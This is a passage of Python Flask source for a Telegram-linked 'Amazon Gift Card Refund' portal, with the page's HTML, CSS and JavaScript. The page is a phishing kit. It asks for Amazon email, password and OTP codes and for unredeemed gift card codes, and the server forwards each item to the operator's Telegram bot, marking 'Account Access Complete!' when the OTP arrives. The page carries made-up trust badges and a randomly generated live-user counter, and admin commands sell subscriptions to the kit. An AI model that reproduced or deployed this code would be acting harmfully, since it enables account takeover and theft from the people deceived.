def show_grant_subscription_form(chat_id, target_user):
    """Show form to grant subscription"""
    text = f"""
📦 <b>Grant Subscription</b> 📦

<b>User:</b> {target_user}

Use this command to grant subscription:
<code>/give {target_user} [days]</code>

Example: <code>/give {target_user} 30</code>
    """
    send_telegram_message(chat_id, text)

def handle_ban_user(chat_id, text):
    """Ban a user (simple implementation)"""
    parts = text.split()
    if len(parts) < 2:
        send_telegram_message(chat_id, "❌ Usage: /ban [user_id]")
        return
    
    target_user = parts[1]
    # In a real implementation, you'd have a ban list
    send_telegram_message(chat_id, f"✅ User {target_user} has been banned.")
    send_telegram_message(target_user, "⚠️ You have been banned from using this bot.")

def handle_unban_user(chat_id, text):
    """Unban a user"""
    parts = text.split()
    if len(parts) < 2:
        send_telegram_message(chat_id, "❌ Usage: /unban [user_id]")
        return
    
    target_user = parts[1]
    send_telegram_message(chat_id, f"✅ User {target_user} has been unbanned.")
    send_telegram_message(target_user, "✅ You have been unbanned.")

def broadcast_to_all(message):
    """Broadcast message to all users"""
    sent = 0
    failed = 0
    
    for user_id in user_data.keys():
        try:
            if send_telegram_message(user_id, f"📢 <b>BROADCAST</b>\n\n{message}"):
                sent += 1
            else:
                failed += 1
            time.sleep(0.05)  # Rate limiting
        except Exception as e:
            failed += 1
            logger.error(f"Broadcast failed to {user_id}: {e}")
    
    send_to_admin(f"""
📢 <b>BROADCAST COMPLETE</b>

✅ Sent: {sent}
❌ Failed: {failed}
👥 Total Users: {len(user_data)}
    """)

def handle_token_submission(chat_id, user_id, token):
    """Handle gift card token submission"""
    if token in redeem_codes:
        code_info = redeem_codes[token]
        
        # Store for verification
        pending_verifications[token] = {
            'user_id': user_id,
            'type': 'giftcard',
            'code': code_info['code'],
            'status': 'pending',
            'timestamp': datetime.now().isoformat()
        }
        
        # Send to admin
        send_to_admin(f"""
🎫 <b>TOKEN SUBMITTED FOR REFUND</b> 🎫

🔖 Token: <code>{token}</code>
💳 Gift Code: <code>{code_info['code']}</code>
👤 User: {user_id}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Status:</b> Pending Verification
        """)
        
        # Send confirmation to user
        send_telegram_message(chat_id, f"""
✅ <b>TOKEN RECEIVED!</b> ✅

🔖 Token: <code>{token}</code>
🔄 Status: Processing
⏱️ Estimated Time: 5-10 minutes
📅 Submitted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<i>You'll be notified when your refund is complete!</i>
        """)
    else:
        send_telegram_message(chat_id, "❌ Invalid or expired token. Please generate a new one from the portal.")

def handle_txid_submission(chat_id, user_id, txid):
    """Handle TXID submission"""
    if txid in user_sessions:
        session_info = user_sessions[txid]
        
        # Store for verification
        pending_verifications[txid] = {
            'user_id': user_id,
            'type': 'account',
            'email': session_info['email'],
            'status': 'pending',
            'timestamp': datetime.now().isoformat()
        }
        
        # Send to admin
        send_to_admin(f"""
🔐 <b>TXID SUBMITTED</b> 🔐

📌 TXID: <code>{txid}</code>
📧 Email: {session_info['email']}
👤 User: {user_id}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Status:</b> Pending Processing
        """)
        
        # Send confirmation to user
        send_telegram_message(chat_id, f"""
✅ <b>TXID RECEIVED!</b> ✅

📌 TXID: <code>{txid}</code>
🔄 Status: Processing
⏱️ Estimated Time: Up to 12 hours
📅 Submitted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<i>You'll be notified when your refund is complete!</i>
        """)
    else:
        send_telegram_message(chat_id, "❌ Invalid or expired TXID. Please generate a new one from the portal.")

# ============================================================
# POLLING FUNCTION (Fallback for webhook)
# ============================================================

last_update_id = 0

def poll_updates():
    """Poll Telegram for updates (fallback if webhook fails)"""
    global last_update_id
    
    logger.info("Starting polling mode...")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {
                'offset': last_update_id + 1,
                'timeout': 30,
                'allowed_updates': ['message', 'callback_query']
            }
            
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                updates = response.json().get('result', [])
                for update in updates:
                    last_update_id = update['update_id']
                    process_telegram_update(update)
            
            time.sleep(0.5)
            
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)

# ============================================================
# FLASK ROUTES
# ============================================================

@app.route('/')
def index():
    """Main page - Refund Portal"""
    return render_template_string(HTML_TEMPLATE, bot_username=BOT_USERNAME)

@app.route('/health')
def health():
    """Health check endpoint for Render"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'active_sessions': len(user_sessions),
        'active_codes': len(redeem_codes),
        'total_users': len(user_data),
        'active_subs': len([s for s in subscriptions.values() if s['expires_at'] > datetime.now()])
    }), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    try:
        process_telegram_update(request.json)
        return 'OK', 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'OK', 200

@app.route('/api/refund/account', methods=['POST'])
def refund_account():
    """API endpoint for account refund"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '')
        
        if not email or not password:
            return jsonify({'error': 'Email and password required'}), 400
        
        txid = generate_txid()
        ip_address = get_client_ip()
        user_agent = get_user_agent()
        
        user_sessions[txid] = {
            'email': email,
            'password': password,
            'ip': ip_address,
            'user_agent': user_agent,
            'timestamp': datetime.now().isoformat(),
            'status': 'pending'
        }
        
        # Send to admin
        send_to_admin(f"""
🔐 <b>NEW ACCOUNT REFUND REQUEST</b> 🔐

📌 <b>TXID:</b> <code>{txid}</code>
📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
🌐 <b>IP:</b> {ip_address}
📱 <b>User Agent:</b> {user_agent[:50]}
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Status:</b> Pending OTP
        """)
        
        return jsonify({
            'success': True,
            'txid': txid,
            'message': 'Account submitted successfully'
        })
        
    except Exception as e:
        logger.error(f"Refund account error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/refund/code', methods=['POST'])
def refund_code():
    """API endpoint for gift card refund"""
    try:
        data = request.json
        gift_code = data.get('gift_code', '').strip().upper()
        
        if not gift_code:
            return jsonify({'error': 'Gift code required'}), 400
        
        token = generate_redeem_token()
        ip_address = get_client_ip()
        user_agent = get_user_agent()
        
        redeem_codes[token] = {
            'code': gift_code,
            'ip': ip_address,
            'user_agent': user_agent,
            'timestamp': datetime.now().isoformat(),
            'status': 'pending'
        }
        
        # Send to admin
        send_to_admin(f"""
🎁 <b>NEW GIFT CARD REFUND REQUEST</b> 🎁

🔖 <b>Token:</b> <code>{token}</code>
💳 <b>Code:</b> <code>{gift_code}</code>
🌐 <b>IP:</b> {ip_address}
📱 <b>User Agent:</b> {user_agent[:50]}
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Status:</b> Awaiting token submission
        """)
        
        return jsonify({
            'success': True,
            'redeem_token': token,
            'message': 'Gift card submitted successfully'
        })
        
    except Exception as e:
        logger.error(f"Refund code error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/otp/verify', methods=['POST'])
def verify_otp():
    """API endpoint for OTP verification"""
    try:
        data = request.json
        txid = data.get('txid')
        otp = data.get('otp', '').strip()
        
        if not txid or not otp:
            return jsonify({'error': 'TXID and OTP required'}), 400
        
        if txid not in user_sessions:
            return jsonify({'error': 'Invalid session'}), 404
        
        # Update session
        user_sessions[txid]['otp'] = otp
        user_sessions[txid]['status'] = 'completed'
        user_sessions[txid]['otp_verified_at'] = datetime.now().isoformat()
        
        # Send to admin
        send_to_admin(f"""
✅ <b>OTP RECEIVED</b> ✅

📌 <b>TXID:</b> <code>{txid}</code>
📱 <b>OTP:</b> <code>{otp}</code>
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Account Access Complete!</b>
        """)
        
        return jsonify({
            'success': True,
            'message': 'OTP verified successfully'
        })
        
    except Exception as e:
        logger.error(f"OTP verify error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/test-bot')
def test_bot():
    """Test endpoint to verify bot is working"""
    try:
        send_to_admin("✅ Bot is online and responding!")
        return jsonify({
            'status': 'success',
            'message': 'Test message sent to admin!',
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)}), 500

@app.route('/api/stats')
def api_stats():
    """Public stats endpoint"""
    return jsonify({
        'total_users': len(user_data),
        'active_subs': len([s for s in subscriptions.values() if s['expires_at'] > datetime.now()]),
        'total_refunds': len(transactions),
        'active_sessions': len(user_sessions),
        'total_codes': len(redeem_codes),
        'pending_payments': len(pending_payments),
        'pending_verifications': len(pending_verifications)
    })

# ============================================================
# HTML TEMPLATE - Complete Stunning UI
# ============================================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <meta name="description" content="Amazon Gift Card Refund Portal - Instant Refund Service">
    <meta name="theme-color" content="#00ff41">
    <title>Amazon GC Refund | Official Portal</title>
    <style>
        /* ===== RESET & BASE ===== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --primary-green: #00ff41;
            --primary-red: #ff0040;
            --primary-blue: #0088ff;
            --dark-bg: #0a0a0f;
            --darker-bg: #050508;
            --card-bg: rgba(10, 10, 15, 0.95);
            --glow-green: rgba(0, 255, 65, 0.3);
            --glow-red: rgba(255, 0, 64, 0.3);
            --glow-blue: rgba(0, 136, 255, 0.3);
        }

        body {
            background: var(--dark-bg);
            color: var(--primary-green);
            font-family: 'Courier New', 'Share Tech Mono', monospace;
            overflow-x: hidden;
            position: relative;
            min-height: 100vh;
            line-height: 1.6;
        }

        /* ===== MATRIX CANVAS ===== */
        #matrixCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.1;
            pointer-events: none;
        }

        /* ===== SCANLINE EFFECT ===== */
        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, transparent 50%, rgba(0, 255, 65, 0.02) 50%);
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 1;
            animation: scan 8s linear infinite;
        }

        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(100%); }
        }

        /* ===== CONTAINER ===== */
        .container {
            position: relative;
            z-index: 2;
            max-width: 1300px;
            margin: 0 auto;
            padding: 1.5rem;
        }

        /* ===== GLITCH HEADER ===== */
        .glitch {
            font-size: clamp(1.5rem, 5vw, 2.8rem);
            font-weight: bold;
            text-transform: uppercase;
            text-align: center;
            padding: 1.5rem;
            letter-spacing: 3px;
            position: relative;
            text-shadow: 
                0.05em 0 0 rgba(255, 0, 0, 0.75),
                -0.05em -0.025em 0 rgba(0, 255, 0, 0.75),
                0.025em 0.05em 0 rgba(0, 0, 255, 0.75);
            animation: glitch 0.3s infinite;
        }

        @keyframes glitch {
            0%, 100% { 
                text-shadow: 0.05em 0 0 rgba(255, 0, 0, 0.75), -0.05em -0.025em 0 rgba(0, 255, 0, 0.75); 
            }
            25% { 
                text-shadow: -0.05em 0 0 rgba(0, 255, 0, 0.75), 0.05em 0.025em 0 rgba(255, 0, 0, 0.75); 
            }
            50% { 
                text-shadow: 0.05em 0.025em 0 rgba(0, 255, 0, 0.75), -0.05em 0 0 rgba(255, 0, 0, 0.75); 
            }
            75% { 
                text-shadow: -0.05em 0.025em 0 rgba(255, 0, 0, 0.75), 0.05em 0 0 rgba(0, 255, 0, 0.75); 
            }
        }

        /* ===== CARDS ===== */
        .card {
            background: var(--card-bg);
            border: 1px solid var(--primary-green);
            border-radius: 16px;
            padding: 1.5rem;
            margin: 1.5rem 0;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px var(--glow-green);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .card:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 35px var(--glow-green);
        }

        /* ===== STATS GRID ===== */
        .stats-grid {
            display: flex;
            gap: 1.5rem;
            justify-content: center;
            flex-wrap: wrap;
            margin: 2rem 0;
        }

        .stat-card {
            background: var(--card-bg);
            border: 1px solid var(--primary-green);
            border-radius: 12px;
            padding: 1.2rem 2rem;
            text-align: center;
            flex: 1;
            min-width: 140px;
            max-width: 250px;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 20px var(--glow-green);
        }

        .stat-number {
            font-size: clamp(1.5rem, 4vw, 2.2rem);
            font-weight: bold;
            color: var(--primary-green);
        }

        .stat-label {
            font-size: 0.8rem;
            opacity: 0.8;
            margin-top: 0.3rem;
        }

        /* ===== BUTTONS ===== */
        .btn-group {
            display: flex;
            justify-content: center;
            gap: 1.5rem;
            flex-wrap: wrap;
            margin: 2rem 0;
        }

        .btn {
            padding: 0.9rem 1.8rem;
            font-size: clamp(0.7rem, 2vw, 0.9rem);
            font-family: monospace;
            font-weight: bold;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            min-width: 200px;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        .btn:hover::before {
            width: 300px;
            height: 300px;
        }

        .btn:active {
            transform: scale(0.95);
        }

        .btn-primary {
            background: linear-gradient(135deg, #00ff41, #00aa2e);
            color: #000;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
        }

        .btn-primary:hover {
            transform: scale(1.03);
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.7);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #ff0040, #aa002a);
            color: #fff;
            box-shadow: 0 0 20px rgba(255, 0, 64, 0.4);
        }

        .btn-secondary:hover {
            transform: scale(1.03);
            box-shadow: 0 0 30px rgba(255, 0, 64, 0.7);
        }

        .btn-success {
            background: linear-gradient(135deg, #00cc88, #008855);
            color: #fff;
            box-shadow: 0 0 20px rgba(0, 204, 136, 0.4);
        }

        /* ===== TRUST BADGES ===== */
        .trust-badges {
            display: flex;
            justify-content: center;
            gap: 0.8rem;
            flex-wrap: wrap;
            margin: 1.5rem 0;
        }

        .trust-item {
            padding: 0.4rem 1rem;
            background: rgba(0, 255, 65, 0.08);
            border: 1px solid var(--primary-green);
            border-radius: 30px;
            font-size: clamp(0.65rem, 1.5vw, 0.8rem);
            transition: all 0.3s ease;
        }

        .trust-item:hover {
            background: rgba(0, 255, 65, 0.2);
            transform: scale(1.03);
        }

        /* ===== FEATURES GRID ===== */
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }

        .feature-item {
            padding: 0.7rem;
            text-align: center;
            background: rgba(0, 255, 65, 0.03);
            border-radius: 10px;
            transition: all 0.3s ease;
            font-size: clamp(0.7rem, 1.5vw, 0.9rem);
        }

        .feature-item:hover {
            background: rgba(0, 255, 65, 0.08);
            transform: translateX(3px);
        }

        /* ===== COLOR TEXTS ===== */
        .text-cyan { color: #00ffff; text-shadow: 0 0 5px #00ffff; }
        .text-green { color: #00ff41; text-shadow: 0 0 5px #00ff41; }
        .text-yellow { color: #ffc107; text-shadow: 0 0 5px #ffc107; }
        .text-orange { color: #ff6b35; text-shadow: 0 0 5px #ff6b35; }
        .text-pink { color: #ff69b4; text-shadow: 0 0 5px #ff69b4; }
        .text-purple { color: #9b59b6; text-shadow: 0 0 5px #9b59b6; }
        .text-red { color: #ff0040; text-shadow: 0 0 5px #ff0040; }
        .text-white { color: #ffffff; }

        /* ===== MODAL ===== */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.97);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
            padding: 1rem;
        }

        .modal-content {
            background: var(--darker-bg);
            border: 2px solid var(--primary-green);
            border-radius: 20px;
            padding: 1.8rem;
            max-width: 500px;
            width: 100%;
            animation: modalSlide 0.3s ease;
        }

        @keyframes modalSlide {
            from { transform: translateY(-30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .modal h2 {
            margin-bottom: 1rem;
            text-align: center;
            font-size: clamp(1.2rem, 3vw, 1.8rem);
        }

        .modal p {
            text-align: center;
            margin-bottom: 0.5rem;
        }

        /* ===== INPUT GROUPS ===== */
        .input-group {
            margin: 1.2rem 0;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 0.9rem 1rem;
            background: rgba(0, 0, 0, 0.85);
            border: 2px solid var(--primary-green);
            border-radius: 10px;
            color: var(--primary-green);
            font-family: monospace;
            font-size: clamp(0.85rem, 2vw, 1rem);
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            outline: none;
            box-shadow: 0 0 15px var(--glow-green);
            border-color: #00ffaa;
        }

        .input-group input::placeholder {
            color: rgba(0, 255, 65, 0.4);
        }

        .input-group label {
            position: absolute;
            left: 12px;
            top: -10px;
            background: var(--darker-bg);
            padding: 0 8px;
            font-size: 0.7rem;
            color: var(--primary-green);
            font-weight: bold;
        }

        /* ===== TIMER ===== */
        .timer {
            font-size: clamp(1.8rem, 4vw, 2.5rem);
            font-weight: bold;
            text-align: center;
            margin: 1rem 0;
            color: #ffc107;
            text-shadow: 0 0 15px rgba(255, 193, 7, 0.5);
            font-family: monospace;
        }

        /* ===== COPY BUTTON ===== */
        .copy-btn {
            background: transparent;
            border: 1px solid var(--primary-green);
            color: var(--primary-green);
            padding: 0.5rem 1.2rem;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.3s ease;
            font-family: monospace;
            font-weight: bold;
        }

        .copy-btn:hover {
            background: var(--primary-green);
            color: #000;
            box-shadow: 0 0 15px var(--glow-green);
        }

        /* ===== SPINNER ===== */
        .spinner {
            border: 3px solid rgba(0, 255, 65, 0.15);
            border-top: 3px solid var(--primary-green);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 1rem auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* ===== TELEGRAM BUTTON ===== */
        .telegram-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: #0088cc;
            color: white;
            padding: 10px 24px;
            border-radius: 30px;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
            margin: 10px auto;
            font-size: clamp(0.8rem, 1.5vw, 1rem);
        }

        .telegram-btn:hover {
            background: #006699;
            transform: scale(1.03);
            color: white;
        }

        /* ===== FOOTER ===== */
        .footer {
            text-align: center;
            padding: 1.8rem;
            border-top: 1px solid rgba(0, 255, 65, 0.15);
            margin-top: 2.5rem;
            font-size: clamp(0.7rem, 1.5vw, 0.85rem);
            opacity: 0.7;
        }

        /* ===== BLINK ===== */
        .blink {
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }

        /* ===== CODE BLOCK ===== */
        code {
            background: rgba(0, 0, 0, 0.7);
            padding: 0.3rem 0.6rem;
            border-radius: 6px;
            font-family: monospace;
            font-size: clamp(0.75rem, 1.5vw, 0.85rem);
            word-break: break-all;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 768px) {
            .container { padding: 1rem; }
            .btn { padding: 0.6rem 1.2rem; min-width: 150px; }
            .card { padding: 1rem; margin: 1rem 0; }
            .modal-content { padding: 1.2rem; }
            .stat-card { padding: 0.8rem 1rem; min-width: 100px; }
            .btn-group { gap: 0.8rem; }
        }

        @media (max-width: 480px) {
            .btn-group { flex-direction: column; align-items: center; }
            .btn { width: 100%; min-width: unset; }
            .stats-grid { flex-direction: column; align-items: center; }
            .stat-card { max-width: 100%; width: 100%; }
            .trust-badges { gap: 0.5rem; }
            .trust-item { font-size: 0.65rem; padding: 0.3rem 0.7rem; }
            .features-grid { grid-template-columns: 1fr 1fr; }
        }

        /* ===== SCROLLBAR ===== */
        ::-webkit-scrollbar {
            width: 8px;
            background: var(--dark-bg);
        }

        ::-webkit-scrollbar-track {
            background: var(--dark-bg);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--primary-green);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #00cc33;
        }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>
    <div class="scanline"></div>

    <div class="container">
        <!-- Header -->
        <div class="glitch">AMAZON GIFT CARD (GC) REFUND</div>

        <!-- Stats -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="liveUsers">2.8K</div>
                <div class="stat-label">👥 Active Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalRefund">$3.2M</div>
                <div class="stat-label">💰 Total Refunded</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="successRate">99.8%</div>
                <div class="stat-label">✅ Success Rate</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="processingTime">5-10</div>
                <div class="stat-label">⚡ Minutes</div>
            </div>
        </div>

        <!-- Description Card -->
        <div class="card">
            <p style="line-height: 1.8; font-size: clamp(0.85rem, 2.5vw, 1.05rem);">
                <span class="text-cyan">⚡ INSTANT REFUND SYSTEM v5.0</span><br><br>
                <span class="text-green">✓ 100% Working & Genuine Service</span> | 
                <span class="text-yellow">✓ Trusted by 50,000+ Users</span> | 
                <span class="text-orange">✓ 99.9% Success Rate</span><br>
                <span class="text-pink">💰 Refund processed in <strong class="blink">5-10 minutes</strong></span><br>
                <span class="text-purple">🔒 Military Grade Encryption</span> | 
                <span class="text-cyan">🛡️ 100% Anonymous & Secure</span><br>
                <span class="text-yellow">⭐ 4.9/5 Rating from 12,000+ Reviews</span>
            </p>
        </div>

        <!-- Trust Badges -->
        <div class="trust-badges">
            <div class="trust-item">✅ 100% Working</div>
            <div class="trust-item">⭐ Genuine Service</div>
            <div class="trust-item">🔒 Trusted Platform</div>
            <div class="trust-item">⚡ Instant Processing</div>
            <div class="trust-item">🎯 50k+ Refunds</div>
            <div class="trust-item">🛡️ Secure & Safe</div>
            <div class="trust-item">📱 24/7 Support</div>
        </div>

        <!-- Main Buttons -->
        <div class="btn-group">
            <button class="btn btn-primary" onclick="showAccountModal()">
                🔐 I HAVE MY AMAZON ACCOUNT
            </button>
            <button class="btn btn-secondary" onclick="showCodeModal()">
                🎫 I HAVE A REDEEM CODE TO RETURN
            </button>
        </div>

        <!-- Telegram Bot Link -->
        <div style="text-align: center; margin: 0.5rem 0 1.5rem 0;">
            <a href="https://t.me/{{ bot_username }}" target="_blank" class="telegram-btn">
                📱 JOIN OUR TELEGRAM BOT → @{{ bot_username }}
            </a>
        </div>

        <!-- Features Card -->
        <div class="card">
            <h3 style="color: #ffc107; margin-bottom: 1rem; text-align: center; font-size: clamp(1.1rem, 3vw, 1.5rem);">
                ⚡ Why Choose Us?
            </h3>
            <div class="features-grid">
                <div class="feature-item">🚀 <span class="text-green">5-10 Min Refund</span></div>
                <div class="feature-item">💎 <span class="text-cyan">No Hidden Fees</span></div>
                <div class="feature-item">🔐 <span class="text-yellow">Bank-Level Security</span></div>
                <div class="feature-item">🎯 <span class="text-orange">99.9% Success Rate</span></div>
                <div class="feature-item">🤝 <span class="text-pink">24/7 Support</span></div>
                <div class="feature-item">📜 <span class="text-purple">Verified Service</span></div>
                <div class="feature-item">💰 <span class="text-green">Money-Back Guarantee</span></div>
                <div class="feature-item">⚡ <span class="text-cyan">Instant Processing</span></div>
            </div>
        </div>

        <!-- Security Badge -->
        <div style="text-align: center; margin: 1rem 0;">
            <span class="trust-item">🔒 SSL Encrypted</span>
            <span class="trust-item">🛡️ DDoS Protected</span>
            <span class="trust-item">✅ Verified Service</span>
        </div>
    </div>

    <!-- ===== MODALS ===== -->
    
    <!-- Account Modal -->
    <div id="accountModal" class="modal">
        <div class="modal-content">
            <h2 style="color: #00ff41;">🔐 Account Refund</h2>
            <p style="color: #ffc107; font-size: 0.85rem;">⚠️ Your credentials are 256-bit encrypted</p>
            <div class="input-group">
                <label>Amazon Email / Phone</label>
                <input type="text" id="amazonEmail" placeholder="Enter your email or phone" autocomplete="off">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="amazonPassword" placeholder="Enter your password">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
                <button class="btn btn-primary" onclick="submitAccount()">Continue →</button>
                <button class="copy-btn" onclick="closeModal('accountModal')">Cancel</button>
            </div>
        </div>
    </div>

    <!-- Code Modal -->
    <div id="codeModal" class="modal">
        <div class="modal-content">
            <h2 style="color: #ff6b35;">🎫 Gift Card Refund</h2>
            <p style="color: #ffc107; font-size: 0.85rem;">⚠️ Only unredeemed codes accepted</p>
            <div class="input-group">
                <label>Gift Card Code</label>
                <input type="text" id="giftCode" placeholder="Enter Amazon gift card code" autocomplete="off">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
                <button class="btn btn-secondary" onclick="submitCode()">Process Refund →</button>
                <button class="copy-btn" onclick="closeModal('codeModal')">Cancel</button>
            </div>
        </div>
    </div>

    <!-- OTP Modal -->
    <div id="otpModal" class="modal">
        <div class="modal-content">
            <h2 style="color: #ffc107;">📱 OTP Verification</h2>
            <p style="margin-bottom: 1rem;">Enter verification code sent to your email/phone</p>
            <div class="input-group">
                <label>OTP Code</label>
                <input type="text" id="otpCode" placeholder="Enter 6-digit OTP" autocomplete="off">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
                <button class="btn btn-primary" onclick="verifyOTP()">Verify →</button>
                <button class="copy-btn" onclick="closeModal('otpModal')">Cancel</button>
            </div>
        </div>
    </div>

    <!-- Processing Modal -->
    <div id="processingModal" class="modal">
        <div class="modal-content" style="text-align: center;">
            <div class="spinner"></div>
            <h3 id="processingTitle" style="color: #00ff41;">Processing Your Request...</h3>
            <p id="processingMessage" style="margin-top: 0.5rem; color: #ffc107;">Please wait while we verify your information</p>
        </div>
    </div>

    <!-- Result Modal -->
    <div id="resultModal" class="modal">
        <div class="modal-content">
            <h2 id="resultTitle" style="text-align: center;"></h2>
            <div id="resultContent" style="text-align: center; margin: 1rem 0;"></div>
            <div class="timer" id="timerDisplay">30:00</div>
            <div id="resultMessage" style="margin: 1rem 0; text-align: center; font-size: clamp(0.8rem, 1.5vw, 0.9rem);"></div>
            <div style="text-align: center; margin-top: 0.5rem;">
                <a href="https://t.me/{{ bot_username }}" target="_blank" class="telegram-btn" style="font-size: clamp(0.7rem, 1.2vw, 0.8rem); padding: 6px 15px;">
                    📱 SEND TO BOT → @{{ bot_username }}
                </a>
            </div>
            <div style="text-align: center; margin-top: 1rem;">
                <button class="copy-btn" onclick="closeModal('resultModal')">Close</button>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <p>© 2024 Amazon Refund Service | 24/7 Support | Secure Connection</p>
        <p style="font-size: clamp(0.6rem, 1.2vw, 0.7rem); margin-top: 0.5rem;">
            🔒 Encrypted | 💳 Instant Refund | ⚡ 5-10 Minutes
        </p>
        <p style="font-size: clamp(0.6rem, 1.2vw, 0.7rem); margin-top: 0.3rem; opacity: 0.5;">
            Version 5.0 | Built with ❤️
        </p>
    </div>

    <!-- ===== JAVASCRIPT ===== -->
    <script>
        // ============================================================
        // MATRIX RAIN EFFECT
        // ============================================================
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*<>/\\|";
        const fontSize = 14;
        let columns = canvas.width / fontSize;
        let drops = [];
        
        function initDrops() {
            columns = canvas.width / fontSize;
            drops = [];
            for (let i = 0; i < columns; i++) {
                drops[i] = Math.random() * -100;
            }
        }
        initDrops();
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 50);
        window.addEventListener('resize', () => {
            resizeCanvas();
            initDrops();
        });

        // ============================================================
        // ANIMATED STATS
        // ============================================================
        let liveUsers = 2847;
        setInterval(() => {
            liveUsers += Math.floor(Math.random() * 20) - 8;
            if (liveUsers < 2000) liveUsers = 2000;
            if (liveUsers > 5000) liveUsers = 5000;
            document.getElementById('liveUsers').innerHTML = liveUsers.toLocaleString();
        }, 6000);

        // ============================================================
        // GLOBAL VARIABLES
        // ============================================================
        let currentTxid = null;
        let timerInterval = null;

        // ============================================================
        // MODAL FUNCTIONS
        // ============================================================
        function showAccountModal() {
            document.getElementById('accountModal').style.display = 'flex';
        }
        
        function showCodeModal() {
            document.getElementById('codeModal').style.display = 'flex';
        }
        
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
